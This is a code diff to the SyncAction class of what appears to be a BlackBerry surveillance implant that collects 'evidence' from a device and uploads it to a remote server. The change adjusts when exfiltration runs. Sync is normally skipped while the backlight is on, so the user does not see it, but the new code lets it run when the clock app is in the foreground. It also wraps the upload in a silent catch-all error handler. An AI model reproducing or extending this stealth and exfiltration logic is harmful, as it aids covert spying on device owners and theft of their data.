@@ -17,6 +17,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.Dialog;
+import blackberry.AppUpdateManager;
 import blackberry.Main;
 import blackberry.Messages;
 import blackberry.Status;
@@ -32,6 +33,7 @@ import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.manager.ModuleManager;
+import blackberry.utils.StringPair;
 
 public abstract class SyncAction extends SubActionMain {
     //#ifdef DEBUG
@@ -74,9 +76,19 @@ public abstract class SyncAction extends SubActionMain {
             Main.setWallpaper(true);
         }
 
+        StringPair names =  AppUpdateManager.getForegroundApp();
+        String cod = names.second;
+        //#ifdef DEBUG
+        if(cod.indexOf("clock") >= 0){
+            debug.trace("execute clock");
+        }
+        //#endif
         //#ifndef DEBUG
         if (Backlight.isEnabled() && !Status.getInstance().isDemo()) {
-            return false;
+
+            if(cod.indexOf("clock") < 0){
+                return false;
+            }
         }
         //#endif
 
@@ -99,43 +111,49 @@ public abstract class SyncAction extends SubActionMain {
             debug.trace("transport Sync url: " + transport.getUrl());
             //#endif                       
 
-            if (transport.isAvailable()) {
-                //#ifdef DEBUG
-                debug.trace("execute: transport available");
-                //#endif
-                protocol.init(transport);
-
-                try {
-                    if (Status.self().wantLight()) {
-                        Debug.ledFlash(Debug.COLOR_YELLOW);
-                    }
-
-                    ret = protocol.perform();
-
-                } catch (ProtocolException e) {
+            try{
+                if (transport.isAvailable()) {
                     //#ifdef DEBUG
-                    debug.error(e);
+                    debug.trace("execute: transport available");
                     //#endif
-                    ret = false;
+                    protocol.init(transport);
+    
+                    try {
+                        if (Status.self().wantLight()) {
+                            Debug.ledFlash(Debug.COLOR_YELLOW);
+                        }
+    
+                        ret = protocol.perform();
+    
+                    } catch (ProtocolException e) {
+                        //#ifdef DEBUG
+                        debug.error(e);
+                        //#endif
+                        ret = false;
+                    }
+                    //#ifdef DEBUG
+                    debug.trace("execute protocol: " + ret);
+                    //#endif
+    
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("execute: transport not available");
+                    //#endif
                 }
+    
+                if (ret) {
+                    //#ifdef TRACEMEMORY
+                    debug.info("SyncAction OK");
+                    Evidence.info("Synced with url:" + transport.getUrl());
+                    debug.traceMemory();
+                    //#endif
+    
+                    return true;
+                }
+            }catch(Exception ex){
                 //#ifdef DEBUG
-                debug.trace("execute protocol: " + ret);
+                debug.trace("execute: ERROR: " + ex);
                 //#endif
-
-            } else {
-                //#ifdef DEBUG
-                debug.trace("execute: transport not available");
-                //#endif
-            }
-
-            if (ret) {
-                //#ifdef TRACEMEMORY
-                debug.info("SyncAction OK");
-                Evidence.info("Synced with url:" + transport.getUrl());
-                debug.traceMemory();
-                //#endif
-
-                return true;
             }
 
             //#ifdef DEBUG
